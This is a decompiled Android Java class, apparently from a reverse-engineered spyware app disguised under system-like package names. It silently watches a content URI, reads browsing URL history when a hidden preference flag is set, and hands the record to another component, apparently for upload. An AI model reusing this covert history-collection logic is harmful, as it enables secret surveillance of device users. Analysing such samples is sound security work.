package com.app.system.common.c;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.os.Handler;
import com.android.system.SyncAndFlushReceiver;
import com.app.system.common.entity.URLHistory;
import com.app.system.common.h.n;
import java.util.HashMap;
import java.util.Map;

public class g
  extends d
{
  private static final Map<String, URLHistory> b = new HashMap(4);
  
  public void a(Context paramContext)
  {
    b(paramContext);
  }
  
  public void b(final Context paramContext)
  {
    if (this.a == null)
    {
      this.a = new ContentObserver(null)
      {
        public void onChange(boolean paramAnonymousBoolean)
        {
          try
          {
            Thread localThread = new java/lang/Thread;
            a locala = new com/app/system/common/c/g$1$a;
            locala.<init>(this);
            localThread.<init>(locala);
            localThread.start();
          }
          catch (Exception localException)
          {
            com.security.d.a.d("ContentObserverForUrl", localException.getMessage(), new Object[0]);
          }
        }
        
        class a
          implements Runnable
        {
          a() {}
          
          public void run()
          {
            try
            {
              if (g.1.this.a.getSharedPreferences("pref", 0).getBoolean("url-active", false))
              {
                if (com.app.system.common.f.a.b(g.1.this.a) == 1) {
                  SyncAndFlushReceiver.c(g.1.this.a);
                }
                Object localObject = new com/app/system/common/a/g;
                ((com.app.system.common.a.g)localObject).<init>(g.1.this.a);
                URLHistory localURLHistory = ((com.app.system.common.a.g)localObject).a();
                if (localURLHistory != null)
                {
                  localObject = new com/app/system/common/h/n;
                  ((n)localObject).<init>(g.1.this.a);
                  ((n)localObject).a(localURLHistory);
                }
              }
            }
            catch (Exception localException)
            {
              com.security.d.a.a("ContentObserverForUrl", localException.getMessage(), new Object[0]);
            }
          }
        }
      };
      paramContext.getContentResolver().registerContentObserver(com.app.system.common.a.a, true, this.a);
    }
  }
  
  public void c(Context paramContext)
  {
    paramContext.getContentResolver().unregisterContentObserver(this.a);
    this.a = null;
  }
}


/* Location:              ~/com/app/system/common/c/g.class
 *
 * Reversed by:           J
 */